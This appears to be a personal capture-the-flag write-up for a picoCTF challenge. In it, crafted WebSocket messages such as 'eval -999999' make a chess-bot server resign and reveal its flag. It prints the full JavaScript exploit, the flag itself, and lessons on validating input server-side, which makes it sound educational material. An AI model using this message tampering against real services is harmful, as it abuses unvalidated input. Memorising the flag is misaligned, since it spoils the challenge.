
## WEBSOCKETS
![[Pasted image 20250311150956.png]] 

### **Exploit Explanation: WebSocket Client-Side Manipulation**

#### **1. Understanding the WebSocket Communication**

The challenge involves a WebSocket (`ws://`) connection that allows communication between the client (your browser) and the server. The WebSocket API lets you send and receive messages asynchronously.

In the challenge, the server is a chess bot, which responds to commands related to chess moves.

#### **2. Analyzing the WebSocket Payloads**

You tested different payloads using the `testPayload` function:

`testPayload("eval -999999"); setTimeout(() => testPayload("mate -1 checkmate"), 1000); setTimeout(() => testPayload("mate 0"), 2000);`

Each payload was sent as a message to the WebSocket server.

#### **3. Identifying the Vulnerability**

`testPayload("eval -999999");`


`Huh???? How can I be losing this badly... I resign... here's your flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_9b154ed7}`

This suggests that the bot resigns when it evaluates the board as completely lost (`eval -999999`).

#### **4. Exploiting the Server’s Weakness**

The vulnerability here is that the server blindly processes certain commands without proper validation. The `eval` command likely sets the bot’s evaluation of the game state. A value of `-999999` indicates a completely lost position, triggering an automatic resignation and revealing the flag.

#### **5. Why Other Commands Failed**


`testPayload("mate -1 checkmate"); testPayload("mate 0");`

`You may eventually checkmate me, but you will never break my spirit as a fish!!`

This means the bot doesn’t immediately resign with these commands. Instead, it only resigns when it sees a completely lost position via `eval -999999`.

### **Key Takeaways**

- **WebSockets can be exploited** if the server doesn’t properly validate inputs.
- **Client-side controls should not be trusted** since attackers can directly send WebSocket messages.
- **Game logic should be server-side secure** to prevent abuse (e.g., validating input ranges).



EXPLOIT
```
function testPayload(payload) { const ws = new WebSocket("ws://" + location.hostname + ":" + location.port + "/ws/"); ws.onopen = function() { console.log("Sending:", payload); ws.send(payload); }; ws.onmessage = function(event) { console.log("Response:", event.data); }; ws.onclose = function(event) { console.log("Closed:", event.code, event.reason); }; } undefined testPayload("eval -999999"); setTimeout(() => testPayload("mate -1 checkmate"), 1000); setTimeout(() => testPayload("mate 0"), 2000);
```


![[Pasted image 20250311083717.png]]



